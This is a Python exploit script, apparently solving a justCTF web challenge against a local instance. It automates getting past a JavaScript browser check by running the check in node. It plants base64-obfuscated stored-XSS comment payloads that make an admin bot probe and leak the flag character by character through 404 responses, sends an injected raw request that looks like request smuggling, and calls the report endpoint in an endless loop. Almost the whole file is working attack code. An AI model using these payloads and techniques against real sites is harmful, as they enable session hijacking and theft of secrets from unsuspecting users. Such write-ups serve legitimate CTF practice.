import base64
import random
import threading
from functools import wraps
from subprocess import check_output
import tempfile
import requests
from requests.cookies import cookiejar_from_dict
import time

REMOTE_ADDR = 'http://127.0.0.1'
HOST = 'ysvegvdwbk6hvokslmdbr1sf6wjuhg.localhost'

def asyncthread(f):
    ''' This decorator executes a function in a Thread'''
    @wraps(f)
    def wrapper(*args, **kwargs):
        thr = threading.Thread(target=f, args=args, kwargs=kwargs)
        thr.start()
    return wrapper


def get_cookies(text):
    script = text.split('<script>')[1].split('</script>')[0]
    script = '''
    var window = {};
    var document = {};
    window.setTimeout = function () {};
    ''' + script

    script = script + '''
    window.onload();
    console.log(document.cookie);
    '''
    script = script.replace('i?module.exports=y', 'false?module.exports=y')

    cookie_val = ''
    with tempfile.NamedTemporaryFile('wt', suffix='.js') as fp:
        fp.write(script)
        fp.flush()
        output_js = check_output(['node', fp.name])
        cookie_val = output_js.decode().replace('res=', '').replace(';', '').strip()
    return {'res': cookie_val}


def set_chall(sess, resp):
    if b'Verifying your browser' in resp.content:
        data = sess.cookies.get_dict()
        data.update(get_cookies(resp.text))
        sess.cookies = cookiejar_from_dict(data)
        return True
    else:
        return False


def add_commend(sess, nickname, comment):
    data = {
        'nickname': nickname,
        'comment': comment,
    }
    url = REMOTE_ADDR + '/api/v1/add_comment'
    t = sess.post(url, json=data, cookies=sess.cookies.get_dict(), headers={'Host': HOST})
    if set_chall(sess, t):
        t = sess.post(url, json=data, cookies=sess.cookies.get_dict(), headers={'Host': HOST})
    return t


def get_comments(sess):
    url = REMOTE_ADDR + '/api/v1/comments'
    t = sess.get(url, cookies=sess.cookies.get_dict(), headers={'Host': HOST})
    if set_chall(sess, t):
        t = sess.get(url, cookies=sess.cookies.get_dict(), headers={'Host': HOST})
    return t


def get_flag(sess):
    url = REMOTE_ADDR + '/api/v1/flag'
    t = sess.get(url, cookies=sess.cookies.get_dict(), headers={'Host': HOST})
    if set_chall(sess, t):
        t = sess.get(url, cookies=sess.cookies.get_dict(), headers={'Host': HOST})
    return t


@asyncthread
def report_to(sess):
    url = REMOTE_ADDR + '/api/v1/report'
    t = sess.post(url, cookies=sess.cookies.get_dict(), headers={'Host': HOST})
    if set_chall(sess, t):
        t = sess.post(url, cookies=sess.cookies.get_dict(), headers={'Host': HOST})
    return t


def get_check_leak(sess, searchPart):
    url = REMOTE_ADDR + '/api/v1/flag?' + searchPart
    headers = {
        'Accept-Language': "en/api/v1/n?,",
        'Host': HOST
    }
    t = sess.get(url, cookies=sess.cookies.get_dict(), headers=headers)
    if set_chall(sess, t):
        t = sess.get(url, cookies=sess.cookies.get_dict(), headers=headers)

    #  status == 404 -> leak ok
    # status != 404 -> not leaked
    return t.status_code == 404


@asyncthread
def trigger_xss():
    # POST /admin/api/v1/last_nickname / GET /admin/
    # ->
    # GET /api/v1/comments?
    url = REMOTE_ADDR + '/'
    data = b'GET /api/v1/comments HTTP/1.1\r\nUser-Agent: injected-'
    t = requests.post(url, data=data, headers={
        'Connection': 'close',
        'Host': HOST,
    })
    # print('trigger_xss:', t.status_code, t.content)
    return t


sess = requests.Session()
sess.headers['User-Agent'] = 'botadmin'

t = get_comments(sess)
print(t.status_code, t.content, t.headers, t.cookies)
if b'src=x onerror=eval' not in t.content:
    xss = '''d="justCTF{test}";for(var i in d)fetch('/api/v1/n?/api/v1/flag?'+d.substring(0,i-(-1)))'''
    xss = base64.b64encode(xss.encode()).decode()
    xss = '''<img src=x onerror=eval(atob('_TUTAJ_'))>'''.replace('_TUTAJ_', xss)
    add_commend(sess, 'cypis', xss)
if b'script>eval(atob' not in t.content:
    xss = '''d="justCTF{test}";for(var i in d)fetch('/api/v1/n?/api/v1/flag?'+d.substring(0,i-(-1)))'''
    xss = base64.b64encode(xss.encode()).decode()
    xss = '''<script>eval(atob('_TUTAJ_'));</script>'''.replace('_TUTAJ_', xss)
    add_commend(sess, 'cypis', xss)

t = get_comments(sess)
print(t.status_code, t.content, t.headers, t.cookies)

while True:
    print('trigger')
    report_to(sess)
    time.sleep(30)
